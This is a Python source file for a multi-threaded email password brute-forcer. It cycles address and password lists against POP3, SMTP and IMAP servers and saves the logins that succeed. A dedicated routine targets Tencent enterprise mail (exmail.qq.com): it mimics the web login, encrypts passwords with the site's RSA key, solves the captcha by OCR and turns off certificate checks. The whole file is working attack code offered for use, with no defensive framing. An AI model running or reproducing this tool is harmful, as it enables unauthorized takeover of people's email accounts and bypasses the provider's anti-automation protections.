# encoding=utf-8

import gevent
from gevent import monkey
monkey.patch_all()
import argparse
from rich.console import Console
import poplib
import smtplib
import imaplib
import queue
import threading
import requests
import base64
import threading
import time
import rsa
import ddddocr
import urllib.parse

logo = r"""
                        一款多协程邮箱爆破工具

   _____         .__.__    _________                       __    
  /     \ _____  |__|  |   \_   ___ \____________    ____ |  | __
 /  \ /  \\__  \ |  |  |   /    \  \/\_  __ \__  \ _/ ___\|  |/ /
/    Y    \/ __ \|  |  |__ \     \____|  | \// __ \\  \___|    < 
\____|__  (____  /__|____/  \______  /|__|  (____  /\___  >__|_ \
        \/     \/                  \/            \/     \/     \/

                                                     by:HumorKing                               
    """

console = Console()

mail_que = queue.Queue()

class Qmail_Crack(threading.Thread):
    def __init__(self,domain='exmail.qq.com'):
        threading.Thread.__init__(self)
        self.domain = domain
        self.ocr = ddddocr.DdddOcr(show_ad=False)
        self.login=requests.Session()


    def get_verifycode(self):
        try:
            image = self.login.get(
                'https://exmail.qq.com/cgi-bin/getverifyimage?aid=23000101&f=html&ck=1&&quot;,Math.random(),&quot;', verify=False).content
            res = self.ocr.classification(image)
        except:
            print('网络错误！')
        #print(res)
        return res

    def gen_mail_list(self):
        with open("./{}".format(self.mailadd), "r", encoding='utf-8') as f:
            mailist = [x.strip() for x in f.readlines()]
        return mailist

    def check_ssl(self, url):
        if 'http' not in url:
            url = "https://"+url
            try:
                requests.packages.urllib3.disable_warnings()
                a = requests.get(url=url,  verify=False)
            except Exception as e:
                url = url.replace("https://", "http://")
        return url

    def judge_alive(self):
        mail_url = "https://{}/login".format(self.domain)
        headers = {
            "Sec-Ch-Ua-Mobile": "?0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close"
        }
        resp = self.login.get(mail_url, headers=headers, verify=False)
        if resp.status_code and resp.status_code == 200:
            return True
        else:
            return False

    def encrypt_with_modulus(self, passwd):
        """
        根据 模量与指数 生成公钥，并利用公钥对内容 rsa 加密返回结果
        """
        m = "CF87D7B4C864F4842F1D337491A48FFF54B73A17300E8E42FA365420393AC0346AE55D8AFAD975DFA175FAF0106CBA81AF1DDE4ACEC284DAC6ED9A0D8FEB1CC070733C58213EFFED46529C54CEA06D774E3CC7E073346AEBD6C66FC973F299EB74738E400B22B1E7CDC54E71AED059D228DFEB5B29C530FF341502AE56DDCFE9"
        e = "10001"
        # print(e)
        e = int(e, 16)
        m = int(m, 16)
        # print(e,m)

        content = '{}\n{}\n'.format(passwd, int(time.time()))
        pub_key = rsa.PublicKey(e=e, n=m)
        m = rsa.encrypt(content.encode(), pub_key)
        b64pass = base64.b64encode(bytes.fromhex(m.hex())).decode("utf-8")
        return b64pass

    def force_pass(self, mailadd, encodepass):
        url = "https://{}/cgi-bin/login".format(self.domain)
        headers = {
            "Sec-Ch-Ua-Mobile": "?0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://{}/".format(self.domain),
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close"
        }
        post_data = {
            'fingerprint_deviceid': 'ffa6217b0245dc7d2fdbcc50e2acb42d',
            'device_type': 'web',
            'device_name': 'chrome',
            'sid': '',
            'firstlogin': 'false',
            'domain': '{}'.format(mailadd.split('@')[1]),
            'aliastype': 'other',
            'errtemplate': 'dm_loginpage',
            'first_step': '',
            'buy_amount': '',
            'year': '',
            'company_name': '',
            'is_get_dp_coupon': '',
            'source': '',
            'qy_code': '',
            'origin': '',
            # 'starttime':'1693575046289',
            'redirecturl': '',
            'p': '{}'.format(encodepass),
            'redirect_hash': '',
            'f': 'biz',
            'uin': "{}".format(mailadd.split('@')[0]),
            'vt': '',
            'delegate_url': '',
            'ts': "{}".format(int(time.time())),
            'from': '',
            'ppp': '',
            'chg': 0,
            'domain_bak': 0,
            'no_force_scan': 0,
            'loginentry': 3,
            'dmtype': '',
            'fun': '',
            'area': '',
            'mobile': '',
            'phone_vc': '',
            'inputuin': '{}'.format(urllib.parse.quote(mailadd)),
            'verifycode': '{}'.format(self.get_verifycode()),
            'data-statistic-login-type': 'home_login'}

        try:
            resp = self.login.post(url, headers=headers,
                                 data=post_data, verify=False)
            print(mailadd + "     Thread OK   "+str(resp.status_code))
            if resp.text and "frame_html?sid=" in resp.text:
                return True
            else:
                return False
        except:
            pass

    def run(self):
        while not mail_que.empty():
            data=mail_que.get()
            mail=data[0]
            passwd=data[1]
            print("cracking! "+mail+':'+passwd)
            if self.judge_alive():
                    try:
                            b64pass = self.encrypt_with_modulus(passwd.strip())
                            result = self.force_pass(mail,b64pass)
                            if result:
                                with open('result.txt','a',encoding='utf-8') as W:
                                    W.write( mail + ":" + passwd+'\n')
                                    print("爆破成功: " + mail + ":" + passwd)
                            else:
                                pass
                    except:
                        pass
            else:
                print("目标邮箱服务器不存活，请检查邮箱服务器。")



class Crack():
    def __init__(self, domain):
        self.success_list=[]
        self.domain = domain
        self.file=open('result.txt','a',encoding='utf-8')

    def pop_crack(self, ssl=False):
        while True:
          if mail_que.qsize() == 0:
              break
          data=mail_que.get()
          mail=data[0]
          passwd=data[1]
          
          if mail in self.success_list:
              break
          if ssl:
              pop3_server = poplib.POP3_SSL(self.domain)
          else:
              pop3_server = poplib.POP3(self.domain)
          console.print(f'cracking {mail}!',style='bold red')
          pop3_server.user(mail)
          try:
              auth = pop3_server.pass_(passwd).decode()
              self.success_list.append(mail)
              console.print(f"crack success!\t{mail}:{passwd}",style='green')
              self.file.write(f"{mail}:{passwd}\n")
          except:
              pass

    def smtp_crack(self, ssl=False):
        while True:
          if mail_que.qsize() == 0:
              break
          data=mail_que.get()
          mail=data[0]
          passwd=data[1]
          if mail in self.success_list:
              break
          if ssl:
              smtp_server = smtplib.SMTP_SSL(self.domain)
          else:
              smtp_server = smtplib.SMTP(self.domain)
          console.print(f'cracking {mail}!',style='bold red')
          try:
              auth=smtp_server.login(mail,passwd)
              self.success_list.append(mail)
              console.print(f"crack success!\t{mail}:{passwd}",style='green')
              self.file.write(f"{mail}:{passwd}\n")
          except:
              pass
    def imap_crack(self, ssl=False):
        while True:
          if mail_que.qsize() == 0:
              break
          data=mail_que.get()
          mail=data[0]
          passwd=data[1]
          if mail in self.success_list:
              break
          if ssl:
              imap_server=imaplib.IMAP4_SSL(self.domain)
          else:
              imap_server=imaplib.IMAP4(self.domain)
          console.print(f'cracking {mail}!',style='bold red')
          try:
              auth=imap_server.login(mail,passwd)
              self.success_list.append(mail)
              console.print(f"crack success!\n{mail}:{passwd}",style='green')
              self.file.write(f"{mail}:{passwd}\n")
          except Exception as e:
              error=str(e).replace('b','').replace('\'','')
              print(error)
        
    def run(self,mail,passwd,model,ssl,t_num):
            console.print("开启协程进行爆破！",style='bold red')
            # 开启多协程
            cos = []
            if model == 'pop':
                for i in range(t_num):
                  c=gevent.spawn(self.pop_crack,ssl)
                  cos.append(c)
            elif model == 'imap':
                for i in range(t_num):
                  c=gevent.spawn(self.imap_crack,ssl)
                  cos.append(c)
            elif model == 'smtp':
                for i in range(t_num):
                  c=gevent.spawn(self.smtp_crack,ssl)
                  cos.append(c)
            gevent.joinall(cos)
if __name__ == '__main__':
        console.print(logo,style='green')
        parser = argparse.ArgumentParser(description='多协议邮箱爆破(POP、SMTP、IMAP)')
        parser.add_argument('--domain', '-d', help='邮箱服务器地址')
        parser.add_argument('--mail', '-m', help='邮箱地址文件',required=True)
        parser.add_argument('--password', '-p', help='密码字典',required=True)
        parser.add_argument('--model', '-a', help='协议[pop,imap,smtp,qq] 默认imap',default='imap')
        parser.add_argument('--ssl','-f',help='使用SSL(默认False)',default=False)
        parser.add_argument('--thread','-t',help='协程数(默认100)',default=100)
        args = parser.parse_args()

        console.print("正在载入数据中.........",style='bold red')
        with open(args.mail,'r',encoding='utf-8') as Mail:
            with open(args.password,'r',encoding='utf-8') as Pass:
                mail_list=Mail.readlines()
                passwd_list=Pass.readlines()
                for mail in mail_list:
                    for passwd in passwd_list:
                        mail=mail.strip()
                        passwd=passwd.strip()
                        data=(mail,passwd)
                        mail_que.put(data)


        mail_crack=Crack(args.domain)
        if args.model !='qq':
            mail_crack.run(args.mail,args.password,args.model,args.ssl,int(args.thread))
        else:
            for i in range(int(args.thread)):#int(thread_num)
                t=Qmail_Crack(args.domain)
                t.start()